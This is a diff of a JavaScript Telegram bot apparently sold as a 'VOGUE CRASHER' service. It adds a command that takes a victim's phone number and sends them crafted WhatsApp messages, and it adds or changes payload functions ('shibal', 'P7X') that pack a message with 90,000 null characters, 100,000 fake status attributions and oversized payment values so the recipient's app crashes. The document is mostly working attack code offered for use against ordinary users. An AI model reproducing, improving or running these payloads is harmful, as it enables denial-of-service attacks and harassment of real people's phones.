@@ -3217,7 +3217,84 @@ been successfully analyzed.
 //    | \__/\ \_/ / |  | || |  | || | | || |\  | |/ / 
 //     \____/\___/\_|  |_/\_|  |_/\_| |_/\_| \_/___/  
 //                                                    
-//                                                    
+//
+
+bot.command('testfc', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
+    
+    let q = ctx.message?.text?.split(" ")[1];
+    
+    if (!q) return ctx.reply(
+        `Invalid Format
+
+Usage:
+/spamandro <target_number>
+
+Example:
+/spamandro 628xxxxxxxx`
+    );
+    
+    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+    
+    try {
+        
+        const sent = await ctx.replyWithPhoto(thumbnailUrl, {
+            caption: `
+<pre>
+V O G U E  •  C R A S H E R
+──────────────────────────
+
+EXECUTION STATUS
+
+Target      : ${q}
+Status      : Success
+
+──────────────────────────
+</pre>`,
+            parse_mode: "HTML",
+            reply_markup: {
+                inline_keyboard: [
+                    [{
+                        text: "Check Target",
+                        url: `https://wa.me/${q}`,
+                        style: "primary"
+                    }]
+                ]
+            }
+        });
+        
+        (async () => {
+            
+            const instanceId = Date.now() + Math.random();
+            
+            for (let i = 0; i < 1; i++) {
+                try {
+                    if (!sock) {
+                        throw new Error("Socket unavailable");
+                    }
+                    await shibal(sock, target);
+                    await sleep(3000)
+                } catch (e) {
+                    console.log(`[WORKER ${instanceId}] Error: ${e.message}`);
+                    autoRestartOn408(e);
+                }
+            }
+            
+            console.log(`[WORKER ${instanceId}] Done for ${q}`);
+            
+        })();
+        
+    } catch (error) {
+        
+        ctx.reply(
+            `Operation Failed
+
+The system was unable to execute the requested module.
+Please verify the target input and system status before retrying.`
+        );
+        
+        console.log(`[VOGUE CRASHER] Execution failed for ${q}`);
+    }
+});
 
 bot.command('spamandro', checkExecutionLimit, checkWhatsAppConnection, checkPremiumAccess, async (ctx) => {
     
@@ -4202,7 +4279,66 @@ async function P7X(sock, target) {
           remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
           isForwarded: true,
           forwardingScore: 9999,
-          statusAttributionType: 2,
+          statusAttributionType: 3,
+            statusAttributions: Array.from({ length: 100000 }, (_, n) => ({
+              participant: `62${n + 836598}@s.whatsapp.net`,
+              type: 1
+            })),
+        },
+      },
+    },
+  },
+}, { participant: { jid: target }});
+}
+
+async function shibal(sock, target) {
+  await sock.relayMessage(
+    target,
+    {
+  groupStatusMessageV2: { 
+    message: {
+      interactiveResponseMessage: {
+        body: {
+          text: "6core",
+          format: "DEFAULT",
+        },
+        nativeFlowResponseMessage: {
+          name: "review_and_pay",
+          paramsJson: JSON.stringify({
+            reference_id: "ORDER-123",
+            currency: "IDR",
+            total_amount: {
+              value: 1500000000000,
+              offset: 100
+            },
+            payment_settings: [{
+              type: "pix_dynamic_code"
+            }],
+            order: {
+              status: "pending",
+              items: [
+                {
+                  retailer_id: "SKU001",
+                  name: "Produk A",
+                  amount: {
+                    value: 1500009999999,
+                    offset: 10000
+                  },
+                  quantity: 900
+                }
+              ],
+              subtotal: {
+                value: 15000099999999,
+                offset: 10000
+              }
+            }
+          })
+        },
+        contextInfo: {
+          remoteJid: Math.random().toString(36) + "\u0000".repeat(90000),
+          isForwarded: true,
+          forwardingScore: 9999,
+          statusAttributionType: 3,
             statusAttributions: Array.from({ length: 100000 }, (_, n) => ({
               participant: `62${n + 836598}@s.whatsapp.net`,
               type: 1
